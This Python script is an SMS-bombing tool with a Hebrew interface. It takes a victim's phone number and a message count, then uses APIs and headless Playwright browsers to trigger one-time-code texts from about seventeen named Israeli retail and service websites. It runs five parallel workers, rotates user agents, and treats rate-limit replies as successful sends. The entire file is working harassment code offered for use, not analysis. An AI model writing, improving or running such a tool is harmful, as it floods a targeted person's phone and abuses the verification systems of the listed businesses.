import asyncio
import random
import sys
import os
import signal
import time
import requests
from typing import List, Dict, Any

# ==========================================
# Environment Setup
# ==========================================
PLAYWRIGHT_AVAILABLE = False
try:
    from playwright.async_api import async_playwright
    # Check for chromium browser
    base_path = os.path.expanduser("~/.cache/ms-playwright")
    if os.path.exists(base_path):
        for item in os.listdir(base_path):
            if "chromium" in item:
                PLAYWRIGHT_AVAILABLE = True
                break
except ImportError:
    pass

# ==========================================
# Global State & Signal Handling
# ==========================================
running = True
sent_count = 0
lock = asyncio.Lock()

def signal_handler(sig, frame):
    global running
    print("\n\n\033[91m[!] עצירה מזוהה! מפסיק את הפעילות מיד...\033[0m")
    running = False

signal.signal(signal.SIGINT, signal_handler)

# ==========================================
# Configuration & Sites
# ==========================================
DEVICE_PROFILES = [
    {"name": "PC", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", "viewport": {"width": 1920, "height": 1080}},
    {"name": "Mobile", "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", "viewport": {"width": 430, "height": 932}}
]

SITES_CONFIG = [
    {
        'name': 'Hamal', 
        'url': 'https://hamal.co.il/settings', 
        'api_url': 'https://users-auth.hamal.co.il/auth/send-auth-code',
        'payload_func': lambda p: {"value": p, "type": "phone"},
        'jokes': ["בודק חדשות..."]
    },
    {
        'name': 'FreeTV', 
        'url': 'https://web.freetv.tv/subscriber/login', 
        'api_url': 'https://web.freetv.tv/api/int/subscribers/msisdn/token?lang=HEB&platform=BROWSER',
        'payload_func': lambda p: {"msisdn": p},
        'jokes': ["מחפש סרט..."]
    },
    {
        'name': 'Delta', 
        'url': 'https://www.delta.co.il/', 
        'api_url': 'https://www.delta.co.il/rest/V1/otp/send',
        'payload_func': lambda p: {"mobile": p},
        'jokes': ["בודק גרביים..."]
    },
    {
        'name': 'Teva Naot', 
        'url': 'https://www.tevanaot.co.il/', 
        'icon_selector': 'button:has-text("התחברות"), .user-icon',
        'phone_selector': 'input[type="tel"]', 
        'submit_selector': 'button[type="submit"]',
        'jokes': ["בודק נעליים..."]
    },
    {
        'name': 'Top Ten', 
        'url': 'https://www.topten-fashion.com/', 
        'icon_selector': 'a[href*="login"]',
        'phone_selector': 'input[type="tel"]', 
        'submit_selector': 'button[type="submit"]',
        'jokes': ["בודק עגילים..."]
    },
    {
        'name': 'Housemen', 
        'url': 'https://housemen.co.il/', 
        'icon_selector': 'a[href*="my-account"]',
        'phone_selector': 'input[type="tel"], #username', 
        'submit_selector': 'button[name="login"]',
        'jokes': ["בודק חולצות..."]
    },
    {
        'name': 'Lee Cooper', 
        'url': 'https://www.leecooper.co.il/', 
        'icon_selector': '#customer-login-link',
        'phone_selector': 'input[name="login[username]"]', 
        'submit_selector': 'button[type="submit"]',
        'jokes': ["בודק ג'ינס..."]
    },
    {
        'name': 'Papa Johns', 
        'url': 'https://www.papajohns.co.il/shop/', 
        'icon_selector': 'a:has-text("התחברות")',
        'phone_selector': 'input[type="tel"]', 
        'submit_selector': 'button[type="submit"]',
        'jokes': ["מזמין פיצה..."]
    },
    {
        'name': 'Timberland', 
        'url': 'https://www.timberland.co.il/', 
        'icon_selector': '#customer-login-link',
        'phone_selector': 'input[name="login[username]"]', 
        'submit_selector': 'button[type="submit"]',
        'jokes': ["בודק מגפיים..."]
    },
    {
        'name': 'Kiko Milano', 
        'url': 'https://www.kikocosmetics.co.il/', 
        'icon_selector': ".customer-login-link",
        'phone_selector': 'input[name="login[username]"]', 
        'submit_selector': 'button[type="submit"]',
        'jokes': ["בודק איפור..."]
    },
    {
        'name': 'Victoria Secret', 
        'url': 'https://www.victoriassecret.co.il/', 
        'icon_selector': ".customer-login-link",
        'phone_selector': 'input[name="login[username]"]', 
        'submit_selector': 'button[type="submit"]',
        'jokes': ["בודק סודות..."]
    },
    {
        'name': 'Naaman', 
        'url': 'https://www.naamanp.co.il/', 
        'icon_selector': 'a:has-text("התחברות")',
        'phone_selector': 'input[name="login[username]"]', 
        'submit_selector': 'button[type="submit"]',
        'jokes': ["בודק סירים..."]
    },
    {
        'name': 'Golf Kids', 
        'url': 'https://www.golfkids.co.il/', 
        'icon_selector': ".customer-login-link",
        'phone_selector': 'input[name="login[username]"]', 
        'submit_selector': 'button[type="submit"]',
        'jokes': ["בודק צעצועים..."]
    },
    {
        'name': 'Castro', 
        'url': 'https://www.castro.com/', 
        'icon_selector': ".customer-login-link",
        'phone_selector': 'input[type="tel"]', 
        'submit_selector': 'button[type="submit"]',
        'jokes': ["בודק אופנה..."]
    },
    {
        'name': 'Hoodies', 
        'url': 'https://www.hoodies.co.il/', 
        'icon_selector': ".customer-login-link",
        'phone_selector': 'input[name="login[username]"]', 
        'submit_selector': 'button[type="submit"]',
        'jokes': ["בודק קפוצ'ונים..."]
    },
    {
        'name': 'Aldo', 
        'url': 'https://www.aldoshoes.co.il/', 
        'icon_selector': ".customer-login-link",
        'phone_selector': 'input[name="login[username]"]', 
        'submit_selector': 'button[type="submit"]',
        'jokes': ["בודק נעליים..."]
    },
    {
        'name': 'Joe Delek', 
        'url': 'https://www.joedelek.co.il/loginpage', 
        'icon_selector': None,
        'phone_selector': 'input[type="tel"]', 
        'submit_selector': 'button[type="submit"]',
        'jokes': ["מתדלק..."]
    }
]

# ==========================================
# UI & Progress
# ==========================================
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_header():
    print(r"""
\033[96m
   _   _   _   _   _   _   _   _   _  
  / \ / \ / \ / \ / \ / \ / \ / \ / \ 
 ( A | L | O | N | O | S | H | E | M )
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
\033[0m
\033[95m[+] מערכת אוטומציה מרובת-תהליכים (V7 - Parallel)\033[0m
\033[90m--------------------------------------------------\033[0m
""")

def print_progress(total):
    global sent_count
    percent = (sent_count / total) * 100
    bar = '█' * int(percent / 2.5) + '░' * (40 - int(percent / 2.5))
    sys.stdout.write(f'\r\033[94mProgress: |{bar}| {percent:.1f}% >> נשלחו: {sent_count}/{total}\033[0m')
    sys.stdout.flush()

# ==========================================
# Core Logic
# ==========================================
async def attempt_send(site: Dict[str, Any], phone: str, browser=None):
    global sent_count, running
    if not running: return False

    # 1. Try API first (Fastest)
    if 'api_url' in site:
        try:
            headers = {
                'User-Agent': random.choice(DEVICE_PROFILES)['user_agent'],
                'Content-Type': 'application/json',
                'Referer': site['url']
            }
            payload = site['payload_func'](phone)
            response = requests.post(site['api_url'], json=payload, headers=headers, timeout=8)
            if response.status_code in [200, 201, 204, 429]:
                async with lock:
                    sent_count += 1
                return True
        except:
            pass

    # 2. Try Browser (Playwright) if API fails or not available
    if browser and 'icon_selector' in site:
        context = await browser.new_context(user_agent=random.choice(DEVICE_PROFILES)['user_agent'])
        page = await context.new_page()
        try:
            await page.goto(site['url'], wait_until="domcontentloaded", timeout=15000)
            
            # Handle cookies/popups quickly
            for s in ['button:has-text("אישור")', 'button:has-text("Accept")', '.close-popup', 'button:has-text("X")']:
                try:
                    el = page.locator(s).first
                    if await el.is_visible(timeout=500): await el.click()
                except: continue

            if site['icon_selector']:
                icon = page.locator(site['icon_selector']).first
                if await icon.is_visible(timeout=2000): await icon.click()
            
            phone_input = page.locator(site['phone_selector']).first
            if await phone_input.is_visible(timeout=2000):
                await phone_input.fill(phone)
                submit = page.locator(site['submit_selector']).first
                if await submit.is_visible(timeout=2000):
                    await submit.click()
                    await asyncio.sleep(2)
                    async with lock:
                        sent_count += 1
                    return True
        except:
            pass
        finally:
            await context.close()
    
    return False

async def worker(semaphore, site_queue, phone, browser, total):
    global running
    while not site_queue.empty() and running and sent_count < total:
        site = await site_queue.get()
        async with semaphore:
            success = await attempt_send(site, phone, browser)
            print_progress(total)
            # Short jittered delay between requests in the same worker
            if running: await asyncio.sleep(random.uniform(1, 3))
        site_queue.task_done()

async def main():
    global running, sent_count
    clear_screen()
    print_header()
    
    phone = input("\033[96mהכנס מספר טלפון: \033[0m").strip()
    if not phone or len(phone) < 9:
        print("\033[91m[!] מספר לא תקין.\033[0m")
        return
    
    try:
        total = int(input("\033[96mכמות הודעות (10-100): \033[0m").strip())
    except:
        total = 10

    print(f"\n\033[92m[⚡] מתחיל שליחה מקבילה עבור {phone}...\033[0m\n")
    
    # Create queue and fill with sites
    site_queue = asyncio.Queue()
    # Shuffle sites and add multiple times to reach total if needed
    all_attempts = []
    while len(all_attempts) < total * 2: # Buffer to ensure we reach total even with failures
        shuffled = list(SITES_CONFIG)
        random.shuffle(shuffled)
        all_attempts.extend(shuffled)
    
    for site in all_attempts:
        await site_queue.put(site)

    # Parallel settings
    max_concurrent = 5 # 5 parallel tasks
    semaphore = asyncio.Semaphore(max_concurrent)
    
    if PLAYWRIGHT_AVAILABLE:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            tasks = [worker(semaphore, site_queue, phone, browser, total) for _ in range(max_concurrent)]
            await asyncio.gather(*tasks)
            await browser.close()
    else:
        tasks = [worker(semaphore, site_queue, phone, None, total) for _ in range(max_concurrent)]
        await asyncio.gather(*tasks)

    if running:
        print(f"\n\n\033[92m[✓] המשימה הושלמה! נשלחו {sent_count} הודעות.\033[0m")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
